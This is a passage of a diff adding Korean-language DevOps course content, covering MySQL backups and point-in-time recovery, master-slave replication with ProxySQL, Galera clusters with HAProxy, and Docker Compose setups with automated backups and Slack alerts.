+0 4 * * 0 aws s3 sync s3://my-backup-bucket/ s3://my-backup-dr-bucket/ --region us-west-2
+
+# 매 6시간마다 Binary Log 백업
+0 */6 * * * mysqlbinlog /var/log/mysql/mysql-bin.* | gzip > /var/backups/binlog_$(date +%Y%m%d_%H).gz
+
+# Cron 로그 확인
+tail -f /var/log/cron
+tail -f /var/log/mysql-backup.log`
+                },
+                {
+                  heading: "5. 백업 복원 절차",
+                  steps: [
+                    {
+                      label: "전체 복원",
+                      code: `# 1. 백업 파일 다운로드
+aws s3 cp s3://my-backup-bucket/mysql/20240101_030000/mydb_20240101_030000.sql.gz .
+
+# 2. 압축 해제 및 복원
+gunzip mydb_20240101_030000.sql.gz
+mysql -u root -p mydb < mydb_20240101_030000.sql
+
+# 3. 확인
+mysql -u root -p -e "SELECT COUNT(*) FROM mydb.users;"`
+                    },
+                    {
+                      label: "특정 테이블만 복원",
+                      code: `# 백업 파일에서 특정 테이블만 추출
+zcat mydb_20240101_030000.sql.gz | sed -n '/DROP TABLE.*\`users\`/,/UNLOCK TABLES/p' > users_only.sql
+
+# 복원
+mysql -u root -p mydb < users_only.sql`
+                    },
+                    {
+                      label: "Point-in-Time Recovery (특정 시점 복구)",
+                      code: `# 시나리오: 오후 2시에 실수로 테이블 삭제, 새벽 3시 백업 있음
+
+# 1. 새벽 3시 백업 복원
+mysql -u root -p mydb < mydb_20240101_030000.sql
+
+# 2. Binary Log로 3시~2시까지 재실행
+mysqlbinlog --start-datetime="2024-01-01 03:00:00" \\
+            --stop-datetime="2024-01-01 14:00:00" \\
+            /var/log/mysql/mysql-bin.* | mysql -u root -p mydb
+
+# 결과: 14시 직전 상태로 복구 완료!`
+                    }
+                  ]
+                },
+                {
+                  heading: "6. 백업 테스트 자동화",
+                  code: `#!/bin/bash
+# test-backup.sh
+
+LATEST_BACKUP=$(ls -t /var/backups/mysql/*.sql.gz | head -1)
+
+# 테스트 DB에 복원
+gunzip -c \${LATEST_BACKUP} | mysql -u root -p test_restore_db
+
+# 테이블 개수 확인
+TABLE_COUNT=$(mysql -u root -p -se "SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='test_restore_db'")
+
+if [ \${TABLE_COUNT} -gt 0 ]; then
+  echo "[\$(date)] Backup test successful: \${TABLE_COUNT} tables restored"
+else
+  echo "[\$(date)] Backup test FAILED!"
+  curl -X POST \${SLACK_WEBHOOK} -d '{"text":"❌ Backup Restore Test Failed!"}'
+fi
+
+# 테스트 DB 삭제
+mysql -u root -p -e "DROP DATABASE test_restore_db"
+
+# 매주 토요일 자동 테스트
+# 0 5 * * 6 /var/scripts/test-backup.sh`
+                },
+                {
+                  heading: "💡 초급 실습 과제",
+                  checklist: [
+                    "매일 자동 백업 스크립트 작성 및 Cron 등록",
+                    "백업 파일을 S3에 자동 업로드 설정",
+                    "7일 이상 된 백업 파일 자동 삭제 확인",
+                    "전체 백업 파일로 복원 테스트 성공",
+                    "특정 테이블만 복원하는 스크립트 작성"
+                  ]
+                }
+              ]
+            },
+            intermediate: {
+              title: "중급: Master-Slave 복제와 읽기 분산",
+              sections: [
+                {
+                  heading: "📚 학습 목표",
+                  content: "Master-Slave 복제를 구성하여 고가용성과 읽기 성능을 향상시킬 수 있다."
+                },
+                {
+                  heading: "1. 복제(Replication)의 이점",
+                  list: [
+                    "고가용성: Master 장애 시 Slave를 Master로 승격",
+                    "읽기 분산: Slave에서 SELECT 쿼리 처리 (성능 2~3배 향상)",
+                    "백업 부하 감소: Slave에서 백업 수행 (Master 영향 없음)",
+                    "지리적 분산: 지역별 Slave 배치로 지연 시간 감소"
+                  ]
+                },
+                {
+                  heading: "2. MySQL Master-Slave 설정",
+                  steps: [
+                    {
+                      label: "Master 서버 설정",
+                      code: `# /etc/mysql/my.cnf (Master)
+[mysqld]
+server-id = 1                    # 고유 ID
+log_bin = /var/log/mysql/mysql-bin.log
+binlog_do_db = mydb              # 복제할 DB
+binlog_format = ROW              # ROW 방식 (안전)
+expire_logs_days = 7             # Binary Log 7일 보관
+max_binlog_size = 100M
+
+# MySQL 재시작
+sudo systemctl restart mysql
+
+# 복제 사용자 생성
+mysql -u root -p
+CREATE USER 'repl'@'%' IDENTIFIED BY 'repl_password';
+GRANT REPLICATION SLAVE ON *.* TO 'repl'@'%';
+FLUSH PRIVILEGES;
+
+# Master 상태 확인 (binlog 파일명과 위치 기록!)
+SHOW MASTER STATUS;
++------------------+----------+--------------+------------------+
+| File             | Position | Binlog_Do_DB | Binlog_Ignore_DB |
++------------------+----------+--------------+------------------+
+| mysql-bin.000001 |      154 | mydb         |                  |
++------------------+----------+--------------+------------------+`
+                    },
+                    {
+                      label: "Slave 서버 설정",
+                      code: `# /etc/mysql/my.cnf (Slave)
+[mysqld]
+server-id = 2                    # Master와 다른 ID
+relay-log = /var/log/mysql/mysql-relay-bin
+log_bin = /var/log/mysql/mysql-bin.log
+read_only = 1                    # 읽기 전용 (안전)
+
+# MySQL 재시작
+sudo systemctl restart mysql
+
+# Master 데이터 복사 (mysqldump)
+mysqldump -u root -p --master-data=2 --single-transaction mydb > master_dump.sql
+
+# Slave에 복원
+mysql -u root -p mydb < master_dump.sql
+
+# Slave 설정
+mysql -u root -p
+CHANGE MASTER TO
+  MASTER_HOST='192.168.1.100',           # Master IP
+  MASTER_USER='repl',
+  MASTER_PASSWORD='repl_password',
+  MASTER_LOG_FILE='mysql-bin.000001',    # SHOW MASTER STATUS에서 확인
+  MASTER_LOG_POS=154;                    # SHOW MASTER STATUS에서 확인
+
+START SLAVE;
+
+# Slave 상태 확인
+SHOW SLAVE STATUS\\G
+
+# 중요 필드:
+# Slave_IO_Running: Yes
+# Slave_SQL_Running: Yes
+# Seconds_Behind_Master: 0       # 복제 지연 시간
+# Last_Error: (비어있어야 함)`
+                    }
+                  ]
+                },
+                {
+                  heading: "3. 애플리케이션에서 읽기/쓰기 분산",
+                  code: `// Node.js에서 Master/Slave 분리
+const mysql = require('mysql2/promise');
+
+// Master Pool (쓰기 전용)
+const masterPool = mysql.createPool({
+  host: '192.168.1.100',
+  user: 'root',
+  password: 'password',
+  database: 'mydb',
+  connectionLimit: 10
+});
+
+// Slave Pool (읽기 전용)
+const slavePool = mysql.createPool({
+  host: '192.168.1.101',
+  user: 'root',
+  password: 'password',
+  database: 'mydb',
+  connectionLimit: 50  // 읽기가 많으므로 더 많은 연결
+});
+
+// 읽기 쿼리 → Slave
+app.get('/api/users', async (req, res) => {
+  const [users] = await slavePool.query('SELECT * FROM users');
+  res.json(users);
+});
+
+// 쓰기 쿼리 → Master
+app.post('/api/users', async (req, res) => {
+  await masterPool.query('INSERT INTO users (name, email) VALUES (?, ?)', [
+    req.body.name,
+    req.body.email
+  ]);
+  res.json({ success: true });
+});
+
+// 여러 Slave가 있을 때 로드 밸런싱
+const slaves = [
+  mysql.createPool({ host: '192.168.1.101', ... }),
+  mysql.createPool({ host: '192.168.1.102', ... }),
+  mysql.createPool({ host: '192.168.1.103', ... })
+];
+
+function getSlavePool() {
+  const index = Math.floor(Math.random() * slaves.length);
+  return slaves[index];
+}
+
+app.get('/api/products', async (req, res) => {
+  const pool = getSlavePool();
+  const [products] = await pool.query('SELECT * FROM products');
+  res.json(products);
+});`
+                },
+                {
+                  heading: "4. ProxySQL로 자동 읽기/쓰기 분리",
+                  code: `# ProxySQL 설치
+docker run -d --name proxysql \\
+  -p 6033:6033 \\
+  -p 6032:6032 \\
+  proxysql/proxysql
+
+# ProxySQL 관리 콘솔 접속
+mysql -u admin -padmin -h 127.0.0.1 -P6032
+
+# Master 추가
+INSERT INTO mysql_servers(hostgroup_id, hostname, port) VALUES (1, '192.168.1.100', 3306);
+
+# Slave 추가
+INSERT INTO mysql_servers(hostgroup_id, hostname, port) VALUES (2, '192.168.1.101', 3306);
+INSERT INTO mysql_servers(hostgroup_id, hostname, port) VALUES (2, '192.168.1.102', 3306);
+
+# 쿼리 라우팅 규칙
+INSERT INTO mysql_query_rules(active, match_pattern, destination_hostgroup, apply)
+VALUES (1, '^SELECT.*FOR UPDATE', 1, 1);  # SELECT FOR UPDATE → Master
+
+INSERT INTO mysql_query_rules(active, match_pattern, destination_hostgroup, apply)
+VALUES (1, '^SELECT', 2, 1);  # SELECT → Slave
+
+# 설정 적용
+LOAD MYSQL SERVERS TO RUNTIME;
+LOAD MYSQL QUERY RULES TO RUNTIME;
+SAVE MYSQL SERVERS TO DISK;
+SAVE MYSQL QUERY RULES TO DISK;
+
+# 애플리케이션은 ProxySQL만 바라봄
+const pool = mysql.createPool({
+  host: '127.0.0.1',
+  port: 6033,  # ProxySQL 포트
+  user: 'root',
+  password: 'password',
+  database: 'mydb'
+});
+
+// 자동으로 SELECT는 Slave, INSERT/UPDATE는 Master로!
+const [users] = await pool.query('SELECT * FROM users');  # → Slave
+await pool.query('INSERT INTO users VALUES (...)');       # → Master`
+                },
+                {
+                  heading: "5. 복제 지연 모니터링",
+                  code: `# Prometheus Exporter for MySQL
+docker run -d --name mysql-exporter \\
+  -p 9104:9104 \\
+  -e DATA_SOURCE_NAME="exporter:password@(slave-host:3306)/" \\
+  prom/mysqld-exporter
+
+# Prometheus 스크랩 설정 (prometheus.yml)
+scrape_configs:
+  - job_name: 'mysql-slave'
+    static_configs:
+      - targets: ['localhost:9104']
+
+# Grafana 알림 규칙
+groups:
+  - name: mysql-replication
+    interval: 30s
+    rules:
+      - alert: ReplicationLag
+        expr: mysql_slave_status_seconds_behind_master > 60
+        for: 5m
+        annotations:
+          summary: "Replication lag is {{ $value }}s"
+
+# 수동 확인 스크립트
+#!/bin/bash
+LAG=$(mysql -u root -p -e "SHOW SLAVE STATUS\\G" | grep Seconds_Behind_Master | awk '{print $2}')
+
+if [ \${LAG} -gt 60 ]; then
+  echo "WARNING: Replication lag is \${LAG} seconds"
+  curl -X POST \${SLACK_WEBHOOK} -d "{\"text\":\"⚠️ Replication lag: \${LAG}s\"}"
+fi`
+                },
+                {
+                  heading: "6. Slave 장애 시 자동 제외",
+                  code: `# ProxySQL에서 헬스 체크 설정
+UPDATE mysql_servers SET max_replication_lag = 10 WHERE hostgroup_id = 2;
+
+# 복제 지연 10초 이상이면 자동으로 라우팅에서 제외
+# 복구되면 자동으로 다시 포함
+
+# Keepalived로 Slave VIP 관리
+# /etc/keepalived/keepalived.conf
+vrrp_script check_mysql {
+    script "/usr/local/bin/check_mysql.sh"
+    interval 2
+}
+
+vrrp_instance VI_1 {
+    state MASTER
+    interface eth0
+    virtual_router_id 51
+    priority 100
+    virtual_ipaddress {
+        192.168.1.200  # Slave VIP
+    }
+    track_script {
+        check_mysql
+    }
+}
+
+# check_mysql.sh
+#!/bin/bash
+mysql -u root -p -e "SELECT 1" > /dev/null 2>&1
+if [ $? -eq 0 ]; then
+  exit 0  # MySQL 정상
+else
+  exit 1  # MySQL 장애 → VIP를 다른 Slave로 이동
+fi`
+                },
+                {
+                  heading: "⚡ 중급 실습 과제",
+                  checklist: [
+                    "Master 1대 + Slave 2대 복제 구성 완료",
+                    "ProxySQL로 자동 읽기/쓰기 분리 설정",
+                    "복제 지연 60초 이상 시 Slack 알림 설정",
+                    "Slave 장애 시 자동으로 라우팅에서 제외되는지 확인",
+                    "읽기 쿼리 부하 테스트 후 Slave로 분산되는지 확인"
+                  ]
+                }
+              ]
+            },
+            advanced: {
+              title: "고급: Multi-Master 클러스터와 자동 페일오버",
+              sections: [
+                {
+                  heading: "📚 학습 목표",
+                  content: "Galera Cluster로 고가용성 DB 클러스터를 구축하고, 자동 페일오버를 구현할 수 있다."
+                },
+                {
+                  heading: "1. Galera Cluster 개념",
+                  content: "모든 노드가 Master인 Multi-Master 동기식 복제 클러스터입니다.",
+                  list: [
+                    "동기식 복제: 쓰기가 모든 노드에 동시 적용 (데이터 일관성 보장)",
+                    "자동 페일오버: 노드 장애 시 자동으로 클러스터에서 제외",
+                    "읽기/쓰기 모두 분산: 모든 노드에서 INSERT/UPDATE 가능",
+                    "제로 다운타임: 노드 추가/제거 시에도 서비스 중단 없음"
+                  ]
+                },
+                {
+                  heading: "2. Galera Cluster 구성 (MariaDB)",
+                  code: `# docker-compose.yml
+version: '3.8'
+services:
+  galera-node1:
+    image: mariadb:latest
+    hostname: galera-node1
+    environment:
+      MYSQL_ROOT_PASSWORD: root
+      MYSQL_DATABASE: mydb
+    volumes:
+      - ./node1-data:/var/lib/mysql
+      - ./galera.cnf:/etc/mysql/conf.d/galera.cnf
+    command: >
+      --wsrep-new-cluster
+      --wsrep-node-name=node1
+      --wsrep-node-address=galera-node1
+
+  galera-node2:
+    image: mariadb:latest
+    hostname: galera-node2
+    environment:
+      MYSQL_ROOT_PASSWORD: root
+    volumes:
+      - ./node2-data:/var/lib/mysql
+      - ./galera.cnf:/etc/mysql/conf.d/galera.cnf
+    command: >
+      --wsrep-node-name=node2
+      --wsrep-node-address=galera-node2
+      --wsrep-cluster-address=gcomm://galera-node1,galera-node2,galera-node3
+
+  galera-node3:
+    image: mariadb:latest
+    hostname: galera-node3
+    environment:
+      MYSQL_ROOT_PASSWORD: root
+    volumes:
+      - ./node3-data:/var/lib/mysql
+      - ./galera.cnf:/etc/mysql/conf.d/galera.cnf
+    command: >
+      --wsrep-node-name=node3
+      --wsrep-node-address=galera-node3
+      --wsrep-cluster-address=gcomm://galera-node1,galera-node2,galera-node3
+
+# galera.cnf
+[mysqld]
+binlog_format=ROW
+default-storage-engine=innodb
+innodb_autoinc_lock_mode=2
+bind-address=0.0.0.0
+
+# Galera 설정
+wsrep_on=ON
+wsrep_provider=/usr/lib/galera/libgalera_smm.so
+wsrep_cluster_name="my-galera-cluster"
+wsrep_sst_method=rsync
+
+# 실행
+docker-compose up -d
+
+# 클러스터 상태 확인
+mysql -u root -p -e "SHOW STATUS LIKE 'wsrep_cluster_size'"
+# wsrep_cluster_size | 3  ← 3개 노드 정상`
+                },
+                {
+                  heading: "3. HAProxy로 로드 밸런싱 + 헬스 체크",
+                  code: `# haproxy.cfg
+global
+    log stdout format raw local0
+
+defaults
+    log     global
+    mode    tcp
+    option  tcplog
+    timeout connect 10s
+    timeout client 30s
+    timeout server 30s
+
+# MySQL 읽기/쓰기 분산
+listen mysql-cluster
+    bind *:3306
+    mode tcp
+    option mysql-check user haproxy_check
+    balance roundrobin
+    server galera-node1 galera-node1:3306 check
+    server galera-node2 galera-node2:3306 check
+    server galera-node3 galera-node3:3306 check
+
+# HAProxy 통계 페이지
+listen stats
+    bind *:8404
+    stats enable
+    stats uri /
+    stats refresh 10s
+
+# docker-compose.yml에 추가
+  haproxy:
+    image: haproxy:latest
+    volumes:
+      - ./haproxy.cfg:/usr/local/etc/haproxy/haproxy.cfg
+    ports:
+      - "3306:3306"
+      - "8404:8404"
+    depends_on:
+      - galera-node1
+      - galera-node2
+      - galera-node3
+
+# 헬스 체크 사용자 생성 (각 노드에서)
+CREATE USER 'haproxy_check'@'%';
+FLUSH PRIVILEGES;
+
+# 애플리케이션은 HAProxy만 바라봄
+const pool = mysql.createPool({
+  host: 'haproxy',  # HAProxy
+  port: 3306,
+  user: 'root',
+  password: 'root',
+  database: 'mydb'
+});
+
+// 어느 노드에 연결되든 상관없이 쓰기/읽기 모두 가능
+await pool.query('INSERT INTO users ...');  # 모든 노드에 동기 복제
+const [users] = await pool.query('SELECT * FROM users');  # 어느 노드에서든 읽기`
+                },
+                {
+                  heading: "4. 자동 Split-Brain 방지",
+                  code: `# Split-Brain: 네트워크 단절로 클러스터가 2개로 분리되는 현상
+
+# 방지 방법 1: 쿼럼 (Quorum) 설정
+# 과반수 노드가 살아있어야만 쓰기 허용
+# 3노드 → 최소 2노드, 5노드 → 최소 3노드
+
+# galera.cnf에 추가
+wsrep_provider_options="pc.ignore_quorum=false;pc.ignore_sb=false"
+
+# 테스트: 2개 노드 다운 시
+docker-compose stop galera-node2 galera-node3
+
+# node1에서 쓰기 시도
+mysql -u root -p -e "INSERT INTO users VALUES (1, 'test')"
+# ERROR: WSREP has not yet prepared node for application use
+# → 쿼럼 부족으로 자동 읽기 전용 전환!
+
+# 방지 방법 2: Arbitrator (중재자) 추가
+# 데이터 없이 투표만 참여하는 경량 노드
+docker run -d --name garbd \\
+  --network mynet \\
+  severalnines/garbd \\
+  --address gcomm://galera-node1,galera-node2,galera-node3 \\
+  --group my-galera-cluster
+
+# 효과: 홀수 투표권 확보 (3노드 + 1 arbitrator = 4표)
+# 2노드 다운 → 1노드 + arbitrator = 2표 (과반수 미달, 쓰기 차단)`
+                },
+                {
+                  heading: "5. Point-in-Time Recovery (PITR) 구현",
+                  code: `# 1. 증분 백업 설정
+# XtraBackup으로 증분 백업
+docker run --rm --volumes-from galera-node1 \\
+  perconalab/percona-xtrabackup \\
+  xtrabackup --backup --target-dir=/backup/full
+
+# 6시간마다 증분 백업
+docker run --rm --volumes-from galera-node1 \\
+  perconalab/percona-xtrabackup \\
+  xtrabackup --backup --incremental-basedir=/backup/full \\
+  --target-dir=/backup/inc1
+
+# 2. Binary Log 보관
+# galera.cnf에 추가
+log_bin = /var/log/mysql/mysql-bin.log
+expire_logs_days = 7
+sync_binlog = 1
+
+# 3. PITR 복구 절차
+# 시나리오: 2024-01-15 14:30에 실수로 테이블 삭제
+
+# Step 1: 가장 최근 전체 백업 복원 (14:00 백업)
+xtrabackup --prepare --target-dir=/backup/full
+xtrabackup --copy-back --target-dir=/backup/full
+
+# Step 2: Binary Log로 14:00 ~ 14:29:59까지 재실행
+mysqlbinlog --start-datetime="2024-01-15 14:00:00" \\
+            --stop-datetime="2024-01-15 14:29:59" \\
+            /var/log/mysql/mysql-bin.* | mysql -u root -p
+
+# 결과: 14:30 직전 상태로 복구!
+
+# 자동화 스크립트
+#!/bin/bash
+# pitr-restore.sh
+
+RESTORE_TIME="$1"  # 예: "2024-01-15 14:29:59"
+BACKUP_DIR="/backup"
+
+# 1. 복원 시점 이전의 가장 최근 백업 찾기
+LATEST_BACKUP=$(find \${BACKUP_DIR} -type d -name "full-*" | sort -r | head -1)
+
+# 2. 백업 복원
+xtrabackup --prepare --target-dir=\${LATEST_BACKUP}
+xtrabackup --copy-back --target-dir=\${LATEST_BACKUP}
+
+# 3. Binary Log로 시점 복구
+BACKUP_TIME=$(cat \${LATEST_BACKUP}/xtrabackup_binlog_info | awk '{print $3}')
+mysqlbinlog --start-datetime="\${BACKUP_TIME}" \\
+            --stop-datetime="\${RESTORE_TIME}" \\
+            /var/log/mysql/mysql-bin.* | mysql -u root -p
+
+echo "Restored to \${RESTORE_TIME}"`
+                },
+                {
+                  heading: "6. 멀티 데이터센터 배포",
+                  code: `# 지리적으로 분산된 Galera Cluster
+# DC1: 서울 (2 nodes)
+# DC2: 도쿄 (2 nodes)
+# DC3: 싱가포르 (1 node + arbitrator)
+
+# galera.cnf (각 노드)
+wsrep_provider_options=" \\
+  gmcast.segment=0; \\           # 세그먼트 ID (DC별로 다르게)
+  evs.suspect_timeout=PT10S; \\  # 네트워크 지연 허용 10초
+  evs.inactive_timeout=PT30S; \\
+  evs.install_timeout=PT15S"
+
+# 네트워크 레이턴시 고려
+# 서울-도쿄: 30ms
+# 서울-싱가포르: 70ms
+# 도쿄-싱가포르: 80ms
+
+# 쓰기 흐름:
+# 1. 서울 노드에 INSERT
+# 2. 모든 노드(도쿄, 싱가포르)에 동기 복제
+# 3. 과반수(3/5) 노드 ACK → 커밋 완료
+# 평균 쓰기 레이턴시: 70~100ms (WAN 환경)
+
+# 읽기 최적화: GeoDNS로 가까운 DC 연결
+# 한국 사용자 → 서울 노드
+# 일본 사용자 → 도쿄 노드
+# 동남아 사용자 → 싱가포르 노드
+
+# ProxySQL에서 지연 기반 라우팅
+INSERT INTO mysql_servers(hostgroup_id, hostname, weight) VALUES
+  (1, 'seoul-node1', 100),      # 가중치 높음
+  (1, 'tokyo-node1', 50),       # 지연 시간 고려
+  (1, 'singapore-node1', 10);   # 지연 시간 가장 큼`
+                },
+                {
+                  heading: "⚡ 고급 실습 과제",
+                  checklist: [
+                    "Galera Cluster 3노드 구성 후 모든 노드에서 쓰기 테스트",
+                    "HAProxy로 로드 밸런싱 설정 및 노드 장애 시 자동 제외 확인",
+                    "XtraBackup으로 증분 백업 후 PITR로 특정 시점 복구",
+                    "Split-Brain 방지를 위한 Arbitrator 추가 및 쿼럼 테스트",
+                    "2개 데이터센터에 Galera 노드 배포 후 지리적 분산 확인"
+                  ]
+                }
+              ]
+            }
+          }
         },
         {
           id: '4-4',
@@ -2772,7 +7753,1359 @@ groups:
           goal: '인프라를 코드로 관리할 수 있다',
           hours: 18,
           keywords: ['Infrastructure as Code', 'Docker Compose', 'disaster recovery'],
-          tasks: []
+          tasks: [],
+          content: {
+            beginner: {
+              title: "초급: Docker Compose로 멀티 컨테이너 환경 구성",
+              sections: [
+                {
+                  subtitle: "1. Docker Compose 기본 구조 이해",
+                  content: `Docker Compose는 여러 컨테이너를 YAML 파일 하나로 정의하고 관리하는 도구입니다.
+
+**docker-compose.yml 기본 구조**:
+\`\`\`yaml
+version: '3.8'
+
+services:
+  # 웹 애플리케이션
+  web:
+    image: node:20-alpine
+    ports:
+      - "3000:3000"
+    environment:
+      - NODE_ENV=production
+      - DB_HOST=db
+    volumes:
+      - ./app:/app
+      - /app/node_modules
+    depends_on:
+      - db
+      - redis
+    networks:
+      - app-network
+    restart: unless-stopped
+
+  # MySQL 데이터베이스
+  db:
+    image: mysql:8.0
+    environment:
+      - MYSQL_ROOT_PASSWORD=\${DB_PASSWORD}
+      - MYSQL_DATABASE=myapp
+    volumes:
+      - mysql-data:/var/lib/mysql
+      - ./init.sql:/docker-entrypoint-initdb.d/init.sql
+    networks:
+      - app-network
+    restart: unless-stopped
+
+  # Redis 캐시
+  redis:
+    image: redis:7-alpine
+    volumes:
+      - redis-data:/data
+    networks:
+      - app-network
+    restart: unless-stopped
+
+volumes:
+  mysql-data:
+  redis-data:
+
+networks:
+  app-network:
+    driver: bridge
+\`\`\`
+
+**주요 개념**:
+- **services**: 실행할 컨테이너들 정의
+- **volumes**: 데이터 영속성 보장
+- **networks**: 컨테이너 간 통신 네트워크
+- **depends_on**: 시작 순서 제어
+- **restart**: 재시작 정책`,
+                  checklist: [
+                    "docker-compose.yml 파일 생성하고 웹/DB/캐시 서비스 정의",
+                    "환경 변수를 .env 파일로 분리 (DB_PASSWORD 등)",
+                    "docker-compose up -d로 전체 스택 실행",
+                    "docker-compose ps로 모든 서비스 상태 확인",
+                    "docker-compose logs -f web으로 로그 실시간 모니터링"
+                  ]
+                },
+                {
+                  subtitle: "2. 환경별 설정 분리 (dev/staging/prod)",
+                  content: `환경별로 다른 설정을 사용하기 위해 Compose Override 기능을 활용합니다.
+
+**베이스 설정 (docker-compose.yml)**:
+\`\`\`yaml
+version: '3.8'
+
+services:
+  web:
+    image: myapp:latest
+    environment:
+      - NODE_ENV=production
+    # 공통 설정들...
+\`\`\`
+
+**개발 환경 오버라이드 (docker-compose.dev.yml)**:
+\`\`\`yaml
+version: '3.8'
+
+services:
+  web:
+    build:
+      context: .
+      dockerfile: Dockerfile.dev
+    environment:
+      - NODE_ENV=development
+      - DEBUG=*
+    volumes:
+      - .:/app  # 소스 코드 실시간 반영
+    ports:
+      - "3000:3000"
+      - "9229:9229"  # Node.js 디버거 포트
+    command: npm run dev
+
+  db:
+    ports:
+      - "3306:3306"  # 로컬 DB 클라이언트 접근
+\`\`\`
+
+**프로덕션 환경 오버라이드 (docker-compose.prod.yml)**:
+\`\`\`yaml
+version: '3.8'
+
+services:
+  web:
+    deploy:
+      replicas: 3
+      resources:
+        limits:
+          cpus: '2'
+          memory: 2G
+        reservations:
+          cpus: '1'
+          memory: 1G
+    logging:
+      driver: "json-file"
+      options:
+        max-size: "10m"
+        max-file: "3"
+
+  db:
+    # 포트 외부 노출 안 함 (보안)
+    # ports 섹션 없음
+\`\`\`
+
+**환경별 실행**:
+\`\`\`bash
+# 개발 환경
+docker-compose -f docker-compose.yml -f docker-compose.dev.yml up
+
+# 프로덕션 환경
+docker-compose -f docker-compose.yml -f docker-compose.prod.yml up -d
+
+# .env 파일로 환경 변수 주입
+echo "DB_PASSWORD=secret123" > .env
+docker-compose --env-file .env up
+\`\`\``,
+                  checklist: [
+                    "docker-compose.dev.yml 생성하고 볼륨 마운트로 핫 리로드 설정",
+                    "docker-compose.prod.yml 생성하고 리소스 제한 설정",
+                    "각 환경별로 실행해서 설정 차이 확인",
+                    ".env.example 파일 생성하고 필요한 환경 변수 문서화",
+                    "docker-compose config로 최종 병합된 설정 확인"
+                  ]
+                },
+                {
+                  subtitle: "3. Health Check와 의존성 관리",
+                  content: `컨테이너가 실제로 준비되었는지 확인하는 Health Check를 설정합니다.
+
+**Health Check 설정**:
+\`\`\`yaml
+version: '3.8'
+
+services:
+  web:
+    image: myapp:latest
+    healthcheck:
+      test: ["CMD", "curl", "-f", "http://localhost:3000/health"]
+      interval: 30s
+      timeout: 10s
+      retries: 3
+      start_period: 40s
+    depends_on:
+      db:
+        condition: service_healthy
+      redis:
+        condition: service_healthy
+
+  db:
+    image: mysql:8.0
+    healthcheck:
+      test: ["CMD", "mysqladmin", "ping", "-h", "localhost"]
+      interval: 10s
+      timeout: 5s
+      retries: 5
+
+  redis:
+    image: redis:7-alpine
+    healthcheck:
+      test: ["CMD", "redis-cli", "ping"]
+      interval: 5s
+      timeout: 3s
+      retries: 5
+\`\`\`
+
+**Wait-for-it 스크립트 사용** (더 정교한 대기):
+\`\`\`yaml
+services:
+  web:
+    image: myapp:latest
+    command: >
+      sh -c "
+        ./wait-for-it.sh db:3306 -t 60 &&
+        ./wait-for-it.sh redis:6379 -t 60 &&
+        npm start
+      "
+    volumes:
+      - ./wait-for-it.sh:/app/wait-for-it.sh
+\`\`\`
+
+**wait-for-it.sh**:
+\`\`\`bash
+#!/bin/bash
+# https://github.com/vishnubob/wait-for-it
+
+TIMEOUT=15
+QUIET=0
+
+while [[ $# -gt 0 ]]; do
+  case "$1" in
+    -t|--timeout)
+      TIMEOUT="$2"
+      shift 2
+      ;;
+    *)
+      HOST=$(echo $1 | cut -d: -f1)
+      PORT=$(echo $1 | cut -d: -f2)
+      shift
+      ;;
+  esac
+done
+
+echo "Waiting for $HOST:$PORT..."
+
+for i in \`seq $TIMEOUT\`; do
+  nc -z $HOST $PORT && echo "Service is up!" && exit 0
+  sleep 1
+done
+
+echo "Timeout waiting for $HOST:$PORT"
+exit 1
+\`\`\``,
+                  checklist: [
+                    "모든 서비스에 healthcheck 설정 추가",
+                    "docker-compose up 실행 후 서비스 시작 순서 확인",
+                    "docker inspect로 health 상태 확인",
+                    "DB 컨테이너를 일부러 중단시켜 재시작 동작 테스트",
+                    "wait-for-it.sh 스크립트 다운로드 후 권한 설정 (chmod +x)"
+                  ]
+                }
+              ]
+            },
+            intermediate: {
+              title: "중급: 인프라 백업/복구 자동화와 모니터링 통합",
+              sections: [
+                {
+                  subtitle: "1. 전체 인프라 백업/복구 자동화",
+                  content: `Docker 볼륨, 설정, 데이터베이스를 모두 백업하는 자동화 시스템을 구축합니다.
+
+**backup-compose.yml** (백업 전용 스택):
+\`\`\`yaml
+version: '3.8'
+
+services:
+  # 정기 백업 서비스
+  backup:
+    image: alpine:latest
+    volumes:
+      - /var/run/docker.sock:/var/run/docker.sock:ro
+      - mysql-data:/backup/mysql:ro
+      - redis-data:/backup/redis:ro
+      - ./backups:/backups
+      - ./backup.sh:/backup.sh
+    environment:
+      - AWS_ACCESS_KEY_ID=\${AWS_ACCESS_KEY_ID}
+      - AWS_SECRET_ACCESS_KEY=\${AWS_SECRET_ACCESS_KEY}
+      - S3_BUCKET=my-infra-backups
+    command: >
+      sh -c "
+        apk add --no-cache docker-cli aws-cli &&
+        crond -f
+      "
+    restart: unless-stopped
+
+volumes:
+  mysql-data:
+    external: true
+  redis-data:
+    external: true
+\`\`\`
+
+**backup.sh** (전체 백업 스크립트):
+\`\`\`bash
+#!/bin/bash
+set -e
+
+DATE=\$(date +%Y%m%d_%H%M%S)
+BACKUP_DIR="/backups/\${DATE}"
+mkdir -p \${BACKUP_DIR}
+
+echo "🔄 Starting full infrastructure backup..."
+
+# 1. Docker Compose 설정 백업
+echo "📄 Backing up Docker Compose configs..."
+cp /app/docker-compose.yml \${BACKUP_DIR}/
+cp /app/.env \${BACKUP_DIR}/
+
+# 2. MySQL 백업 (컨테이너 내부에서 실행)
+echo "💾 Backing up MySQL..."
+docker exec mysql mysqldump -u root -p\${MYSQL_ROOT_PASSWORD} \\
+  --all-databases --single-transaction --quick \\
+  | gzip > \${BACKUP_DIR}/mysql_\${DATE}.sql.gz
+
+# 3. Redis 백업 (RDB 파일 복사)
+echo "📦 Backing up Redis..."
+docker exec redis redis-cli BGSAVE
+sleep 5  # RDB 저장 대기
+docker cp redis:/data/dump.rdb \${BACKUP_DIR}/redis_\${DATE}.rdb
+
+# 4. Docker 볼륨 직접 백업
+echo "📂 Backing up Docker volumes..."
+tar czf \${BACKUP_DIR}/volumes_\${DATE}.tar.gz -C /backup mysql redis
+
+# 5. 전체 백업을 하나로 압축
+echo "🗜️  Compressing full backup..."
+tar czf /backups/full_backup_\${DATE}.tar.gz -C /backups \${DATE}
+
+# 6. S3 업로드
+echo "☁️  Uploading to S3..."
+aws s3 cp /backups/full_backup_\${DATE}.tar.gz \\
+  s3://\${S3_BUCKET}/infra/\${DATE}/ \\
+  --storage-class STANDARD_IA
+
+# 7. 로컬 백업 정리 (7일 이상 된 것 삭제)
+find /backups -name "full_backup_*.tar.gz" -mtime +7 -delete
+
+echo "✅ Backup completed: \${DATE}"
+
+# Slack 알림
+curl -X POST \${SLACK_WEBHOOK_URL} \\
+  -H 'Content-Type: application/json' \\
+  -d "{\"text\":\"✅ Infrastructure backup completed: \${DATE}\"}"
